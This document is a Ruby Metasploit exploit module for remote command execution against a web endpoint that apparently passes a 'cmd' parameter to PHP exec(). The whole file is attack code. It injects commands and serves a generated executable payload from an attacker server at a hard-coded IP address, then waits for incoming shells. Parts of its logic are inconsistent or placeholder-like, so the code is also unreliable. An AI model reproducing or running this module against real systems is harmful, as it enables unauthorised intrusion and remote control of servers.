    require 'msf/core'

    class MetasploitModule < Msf::Exploit
        include Msf::Exploit::EXE
        include Msf::Exploit::Remote::HttpClient
        include Msf::Exploit::Remote::HttpServer::HTML

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'Rot.fi HTTP Remote Command Execution',
                'Description'    => %q{
                    This exploit module abuses a RCE vuln in caused by a bad example use of a php exec() function
                },
                'Author'         => [ 'iamj3k @RoT' ],
                'License'        => 'This is my license',
	        'Payload'        => { 'BadChars' => "\x00" },
	        'Platform'       => 'linux',
	        'Targets'        =>
        	  [
	            [ 'Automatic', {} ],
	          ],
	        'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('TARGETURI', [true, 'The base path', '/']),
                    OptString.new('CMD', [true, 'Execute this command', 'hostname']),
                    OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '94.22.121.53']),
                    OptInt.new('SRVPORT', [true, 'HTTP Server Port', '3000'])
                ], self.class)
        end

        def primer
        end
        
    	def on_request_uri(cli, req)
            @pl = generate_payload_exe
    	    print_status("#{peer} - Payload request received: #{req.uri}")
            send_response(cli, @pl)
    	end

        def check
            uri = "/"
            res = send_request_raw({
                'method'   => 'GET',
                'uri'      => normalize_uri(uri, '/',"vulnerable_url?cmd"),
            })
            if res && res.code == 200
               Exploit::CheckCode::Vulnerable
            else
               Exploit::CheckCode::Safe
            end
        end

	    def request(cmd)
              datastore['SSL'] = true
              uri = "/"
              print_status(target_uri.path)
              res = send_request_raw({
                'method'   => 'GET',
                'uri'      => normalize_uri(uri, '/',"vulnerable_url?cmd="+cmd)
              })
              if [200].include?(res.code)
                print_status("#{rhost}:#{rport} - Request sent...")
              else
                fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
              end
        end

        def exploit
             datastore['SSL'] = false
             cmd=datastore['CMD']
	         srvhost=datastore['SRVHOST']
	         srvport=datastore['SRVPORT']
             filename = datastore['TARGETURI']
             resource_uri="/"+filename

	         start_service({'Uri' => {
        	    'Proc' => Proc.new { |cli, req|
	             on_request_uri(cli, req)},
	             'Path' => resource_uri
	          }})
              print_status("#{rhost}:#{rport} - Blind Exploitation")
              request(cmd)

              sleep(10)

              print_status("#{srvhost}:#{srvport} - Waiting 3 minutes for shells")
              sleep(150)
        end
    end
